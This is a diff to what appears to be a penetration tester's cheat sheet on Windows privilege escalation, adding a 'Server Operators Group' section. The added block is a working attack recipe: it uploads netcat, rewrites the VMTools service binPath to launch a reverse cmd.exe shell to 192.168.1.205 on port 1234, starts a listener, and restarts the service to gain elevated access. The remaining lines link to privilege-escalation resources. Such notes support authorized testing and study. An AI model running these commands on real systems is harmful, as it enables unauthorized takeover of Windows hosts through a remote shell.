@@ -167,6 +167,23 @@ windows + u
 # SeManageVolume
 - https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/
 ---
+# Server Operators Group
+```powershell
+services
+
+upload nc.exe
+
+sc.exe config VMTools binPath="C:\Users\aarti\Documents\nc.exe -e cmd.exe 192.168.1.205 1234"
+
+sc.exe config VMTools binPath="C:\temp\shell.exe"
+
+nc -vnlp 1234
+
+sc.exe stop VMTools
+
+sc.exe start VMTools
+```
+---
 # priviledge escalation
 - https://github.com/gtworek/Priv2Admin
 ---
